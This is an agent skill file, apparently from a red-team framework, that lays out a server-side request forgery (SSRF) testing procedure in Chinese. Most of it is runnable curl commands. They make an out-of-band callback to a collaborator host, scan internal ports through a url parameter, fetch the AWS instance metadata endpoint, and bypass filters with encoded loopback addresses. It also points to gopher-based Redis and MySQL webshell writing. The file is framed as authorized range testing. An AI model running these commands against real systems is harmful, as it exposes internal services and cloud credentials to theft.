---
name: ssrf-testing
description: >-
  Probes server-side request forgery via url/fetch/webhook parameters—cloud metadata,
  internal port scan, and protocol smuggling—with evidence in runs/. Use when user
  mentions SSRF/服务端请求/url=参数/内网探测/169.254/云元数据.
whenToUse: 存在让用户提供 URL 的功能（导入/预览/ webhook/ PDF 生成/头像拉取）
role: exploit
enabled: true
---

# SSRF 测试（内网探测 + 云元数据）

## 何时用 / 何时不用

| 用 | 不用 |
|---|---|
| `url=` / `src=` / `path=` 请求外部资源 | 纯客户端跳转 |
| 云主机靶场 | 已确认参数仅白名单域名且无法绕过 |

## 标准流程

```bash
mkdir -p runs/ssrf-TARGET
# 1) 出网验证（Burp Collaborator / interactsh / 自建 DNS log）
curl -s "http://TARGET/fetch?url=http://COLLABORATOR.oast.fun" -o runs/ssrf-TARGET/collab.txt

# 2) 内网端口（逐端口或 gopher 需协议支持）
for p in 22 80 443 6379 8080; do
  curl -s -m 3 "http://TARGET/fetch?url=http://127.0.0.1:$p" \
    -o "runs/ssrf-TARGET/127.0.0.1-$p.txt"
done

# 3) 云元数据（AWS/GCP/Azure 演练靶场）
curl -s "http://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/" \
  -o runs/ssrf-TARGET/aws-meta.txt

# 4) 绕过常见过滤
# 127.0.0.1 → 2130706433 / 0x7f000001 / [::1] / 0177.0.0.1
curl -s "http://TARGET/fetch?url=http://2130706433/" -o runs/ssrf-TARGET/bypass-decimal.txt
```

### 协议与 gopher（Redis/MySQL 写马，需服务端支持 gopher://）

- 确认支持后再构造 gopher payload；复杂链参考 `unauth-exploit` Redis 章节

## 与其它技能的分工

| 场景 | 技能 |
|---|---|
| SSRF 打到 Redis | `unauth-exploit` |
| 内网全段扫描 | `gogo-intranet`（需先隧道） |
| URL 参数 SQLi | `sqli-testing` |

## 输出与落库

1. `redteam_vuln_add` — type=`ssrf`, param, internal_hit, metadata_leak
2. `redteam_chain_add` — 每条探测 URL + 响应摘要

## 纪律

1. 内网探测限速，避免打挂目标
2. 元数据凭证只用于演练证明，不写进仓库
